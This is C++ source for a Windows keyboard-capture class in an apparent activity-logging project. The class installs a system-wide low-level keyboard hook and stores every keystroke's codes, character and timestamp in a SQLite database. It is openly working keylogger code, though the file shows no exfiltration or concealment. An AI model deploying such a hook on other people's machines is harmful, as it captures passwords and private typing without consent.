//
// Created by Chrystalkey on 02.07.2020.
//

#include "keypress_type.h"
#include "../global_functions.h"
#include "../FlobbelSafe.h"
#include "capturecollection.h"
#include <map>
#include <memory>

HHOOK KeyboardCapture::keyboardHook = NULL;
bool KeyboardCapture::exists = false;

KeyboardCapture::KeyboardCapture() {
    if(exists)
        throw instance_exists_error("Keyboard Capture");
    exists = true;
    self = this;
    infoType = FlobGlobal::Keypress;
    sql_table = "CREATE TABLE IF NOT EXISTS keypress_type("
                "id INTEGER PRIMARY KEY,"
                "up INTEGER,"
                "scancode INTEGER,"
                "vkcode INTEGER,"
                "char TEXT,"
                "time TEXT);";

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,llkeyhook, NULL,0);
}

KeyboardCapture::~KeyboardCapture() {
    UnhookWindowsHookEx(keyboardHook);
}

void KeyboardCapture::sql_action(const Info* inf){
    auto pack = (KeypressInfo*)inf;
    FCS.safe->insert_data(L"INSERT INTO keypress_type(up, scancode, vkcode, char, time) VALUES (?,?,?,?,?)",
                          {
                            new sql_int(0),
                            new sql_int(pack->scancode),
                            new sql_int(pack->vkcode),
                            new sql_str(pack->descr),
                            new sql_str(pack->timestamp)
                          });
}

LRESULT KeyboardCapture::llkeyhook(int nCode, WPARAM wParam, LPARAM lParam) {
    if(nCode != HC_ACTION) return CallNextHookEx(keyboardHook,nCode,wParam,lParam);
    KeypressInfo info;
    KBDLLHOOKSTRUCT *further = (KBDLLHOOKSTRUCT*)lParam;
    std::wstring time = timestamp();

    switch(wParam){
        case WM_KEYDOWN:
            info.updown += 0;
            break;
        case WM_KEYUP:
            info.updown += 1;
            break;
        case WM_SYSKEYDOWN:
            info.updown += 2;
            break;
        case WM_SYSKEYUP:
            info.updown += 3;
            break;
        default:
            info.updown += -1;
    }
    info.ch = FCS.handle;
    info.infotype = FlobGlobal::Keypress;
    info.scancode = (unsigned)further->scanCode;
    info.vkcode = (unsigned)further->vkCode;
    info.timestamp = time;
    wcsncpy(info.descr,map(info.vkcode).c_str(),(size_t)4);
    self->sql_action(&info);
    return CallNextHookEx(keyboardHook,nCode,wParam,lParam);
}